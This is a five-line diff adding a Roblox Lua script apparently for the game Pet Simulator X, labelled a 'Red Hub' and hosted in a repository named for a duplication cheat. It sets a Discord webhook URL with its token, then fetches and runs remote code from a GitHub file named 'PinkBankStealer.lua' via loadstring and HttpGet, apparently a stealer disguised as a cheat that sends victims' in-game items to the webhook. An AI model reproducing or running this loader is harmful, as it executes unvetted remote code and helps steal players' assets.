@@ -1,0 +1,5 @@
+_G.Webhook = "https://discord.com/api/webhooks/1080442957615878194/i3-th39dSpIJxGitq-tL5UwxHeGmFkYlxIfixL8dUuKoO78d3-Pe5VvBn81lW4Ngs2nK"
+_G.LoadingText = "Pet Simulator X Red Hub"
+_G.UserId = Xuhies
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkBankStealer.lua", true))()
